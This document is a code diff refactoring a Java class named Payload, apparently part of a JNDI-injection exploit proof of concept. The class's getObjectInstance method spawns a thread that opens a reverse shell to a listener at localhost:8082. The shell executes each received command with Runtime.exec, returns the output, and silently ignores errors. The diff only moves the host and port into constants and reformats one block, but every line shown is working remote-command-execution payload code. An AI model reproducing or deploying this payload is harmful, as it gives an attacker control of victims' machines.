@@ -10,6 +10,9 @@ import java.util.Hashtable;
 
 public class Payload implements ObjectFactory {
 
+    private static final String HOST = "localhost";
+    private static final int PORT = 8082;
+
     @Override
     public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
         new Thread(() -> {
@@ -21,8 +24,7 @@ public class Payload implements ObjectFactory {
     }
 
     private void reverseShell() throws IOException {
-        Socket socket = new Socket("localhost", 8082);
-
+        Socket socket = new Socket(HOST, PORT);
         try (
                 PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                 BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
@@ -31,9 +33,7 @@ public class Payload implements ObjectFactory {
                 String command = in.readLine();
                 try {
                     Process process = Runtime.getRuntime().exec(command);
-                    try (
-                            BufferedReader processReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
-                    ) {
+                    try (BufferedReader processReader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                         processReader.lines().forEach(out::println);
                     }
                 } catch (Exception e) {}
